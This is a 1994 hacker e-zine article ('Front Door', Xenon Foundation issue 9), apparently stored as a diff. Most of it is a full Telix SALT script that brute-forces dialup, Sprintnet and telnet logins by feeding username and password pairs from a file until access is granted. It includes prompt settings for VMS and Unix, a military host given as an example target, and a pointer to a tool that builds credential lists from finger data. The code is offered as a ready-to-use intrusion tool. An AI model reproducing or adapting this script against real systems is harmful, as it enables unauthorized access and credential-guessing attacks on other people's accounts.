@@ -1,0 +1,216 @@
+                                    __
+                      \ /          |_
+                      / \ e n o n  |  o u n d a t i o n 
+                                
+                                  presents:
+                                  
+                                  \     /
+                      *------  the  \ /  
+                                    / \  files  ------*
+                                  /     \
+                
+                           January/1994  Issue: 9 
+                      
+                      ______________________________
+                   ///                              \\\
+                  ...    The Telix Script Hacker:    ...
+                  ...                                ...
+                  ...          "Front Door"          ...
+                  ...                                ...
+                  ...      Written by: Erik Turbo    ...
+                  ...                                ...
+                   \\\______________________________///
+
+
+There  are few  people that recognize  that there is an easy and extremely
+powerful method of hacking, that you can use in lieu of manual brute force
+techniques.  It can  be done  quite  simply with  the Telix SALT language,
+which is included in every shareware package of the popular communications
+software, "Telix". Although arguably not the best in communications on the
+IBM platform,  Telix  does have a rather powerful scripting language  that
+almost anyone can learn quickly,  and  efficiently.  Since  the  SALT will
+handle  all  communication Input/Output, you need not worry about  looking
+for  any serial  libraries  for your C compiler (or worse yet, writing the
+serial I/O yourself.),  and you also won't have the annoying need to leave 
+your  communications  package  for  its  execution;  the  SALT is executed
+straight out of Telix. The following program is the most basic form of the 
+password hacker.  It  basically looks for certain strings to pass over the 
+modem,  and  then answers  their  inquiries by pulling lines from an ASCII 
+text file.  Feel  completely  free to modify  the existing code to include 
+menus  and prompts  (instead of hard-coded variables),  as well as support 
+for hacking miscellaneous operating systems.  As is, the following program 
+should take care of all your front door hacking needs... enjoy!
+
+------------------------------- ( Cut Here ) -----------------------------------
+main()
+{
+// 'Front Door' written by Erik Turbo
+//
+// Variable initialization:
+// ===========================================
+   int stat, t1, t2, t3, t4, t5;
+   str pass[80], username[80], site_name[80];
+   str default_file[80];
+// ===========================================
+//
+//
+fclose(default_file); // LEAVE this!  It closes the default_file  
+                      // in case your previous hack terminated incorrectly
+                      // prior to running this program.
+
+// ------------------------( CONFIGURATION )----------------------------
+//
+// Variable Declaration - VERY Important!  Here, you have to change the   
+// string values of the following 'track' variables, in order to 
+// customize this program for the system you are trying to gain access to.
+// The following is a listing of what the actual track variables denote:   
+//
+// t1 = The login prompt (ex: 'Enter your Name:', or what not.)
+// t2 = The password prompt (ex: 'Enter your password:')
+// t3 = The string that implies a connection has been closed (ex: NO CARRIER)   
+// t4 = The string that denotes success. (ex: Access granted.)
+// t5 = The string that indicates a login failure. Only necessary on machines
+//      that force you to press enter after a failure, otherwise it is
+//      meaningless and can be set to any value that will not conflict with
+//      the others.
+//   
+// When hacking a dialup, set the t3 value to 'NO CARRIER'
+// t3 = track("NO CARRIER", 0);
+//
+// When hacking from Sprintnet, set the t3 value to '@'
+// t3 = track("@", 0);
+//
+// When hacking from the Internet, set the t3 value to 'closed'
+// t3 = track("closed", 0);
+//   
+// Now that you have your 't3' variable configured for the network 
+// connection, you now have to set the remaining track variables for
+// the program to recognize what system you are hacking.
+//    
+// For VMS set the values as follows:
+// t1 = track("Username: ", 0);   
+// t2 = track("Password:", 0);
+// t4 = track("Interactive", 0);  
+// t5 = track("User authorization failure", 0);
+//   
+// For a Unix based machine, use the following:
+// t1 = track("login:", 0);
+// t2 = track("Password:", 0);
+// t4 = track("Last login", 0);
+// t5 = track(" ",0);
+// 
+// There are few more variables that have to be set, to configure the program
+// to hack your system.
+//
+// The 'site_name' variable is the actual node name, or telephone number, of
+// the system you wish to hack.  If you set your 't3' variable to indicate 
+// you were hacking off the telephone network, than set the 'site_name' 
+// variable to the telephone number you are going to hack.  If you are 
+// hacking off the internet, or similar node-based network, than set it to 
+// the address of the system you are hacking.
+//
+// Examples:
+//
+// site_name = "999-9999"
+// site_name = "norad.navy.mil'
+// site_name = "617034"
+//
+// Hacking Information File - Contains usernames and passwords to attempt.
+//
+// default_file = fopen("hack.dat", "r");
+//
+// The 'default_file' variable is the heart of this entire program.  The
+// file that it points to, is the file that YOU HAVE TO create in order
+// for this program to work!  In this example, the file it points to is
+// 'hack.dat'.  'HACK.DAT' is an ASCII file that you must write, which
+// contains all account information, as well as the passwords you wish
+// to attempt using.  The format of the HACK.DAT ascii file is as follows:
+//
+// ACCOUNT1
+// PASSWORD1
+// ACCOUNT1
+// PASSWORD2
+// ACCOUNT1
+// PASSWORD3
+// ACCOUNT2
+// PASSWORD1
+//
+// ... and so on, and so forth.  You may have as many combinations of
+// accounts and passwords as you like -- it is not limited by size.
+// You, however, MUST use that format, since the program reads that data
+// file sequentially, and will not know the difference between a username
+// and a password. (obviously. hehe...) 
+//   
+
+
+
+hack:
+
+cputs("telnet "); // CHANGE this to suit your needs. It will usually be set 
+                  // to one of the following values depending on how you are
+                  // hacking:
+                  // cputs("telnet "); if you are hacking the Internet
+                  // cputs("ATDT "); if you are hacking a dialup
+                  // cputs("C "); if you are hacking Sprintet, or a Decserver.
+
+cputs(site_name); // This should have already been set to the address name or 
+                  // telephone number of the system you are hacking.
+
+cputs("^M");      // Presses ENTER for you, after it sends the strings.
+  
+while (1)         // Begins an indefinitive loop.
+{
+terminal();       // Allows for two-way communication between you and the 
+                  // remote system.
+
+stat = track_hit(0); // Starts checking for the track variables to appear
+                     // over the modem.
+
+if (stat == t1)
+   {
+   fgets(username, 80, default_file);
+   cputs(username);
+   cputs("^M");
+   }
+   // Gets a line from HACK.DAT and sends it over the modem, pressing enter
+   // when complete.  This string SHOULD be the username if you entered the
+   // information in HACK.DAT correctly.
+   
+if (stat == t2) 
+   {
+   fgets(pass, 80, default_file);
+   cputs(pass);
+   cputs("^M");
+   prints(pass);
+   }
+   // Gets a line from HACK.DAT and sends it over the modem, pressing enter
+   // when complete.  This string SHOULD be the password if you entered the
+   // information in HACK.DAT correctly.
+
+if (stat == t3)
+   goto hack;
+   // That username and password did not work, so the program goes back 
+   // through the loop again.
+
+if (stat == t4)
+   {
+   printc(7);
+   printc(7);
+   printc(7);
+   }
+   // You got in!  Three beeps from your speaker will lure you to your
+   // terminal if you are away.
+
+if (stat == t5)
+   cputs("^M");
+   // Necessary only on VMS systems and similar machines that require you
+   // to press ENTER after a failed login attempt.
+
+}
+}
+------------------------------- ( Cut Here ) -----------------------------------
+
+Also - For a great program to be used with 'Front Door', download PASS.EXE
+       from Black ICE Consortium. (located in the /bin directory)
+       This program will create HACK.DAT ASCII files for you, and even
+       modify TCP/IP 'finger' files to be used by the HACK.DAT format.
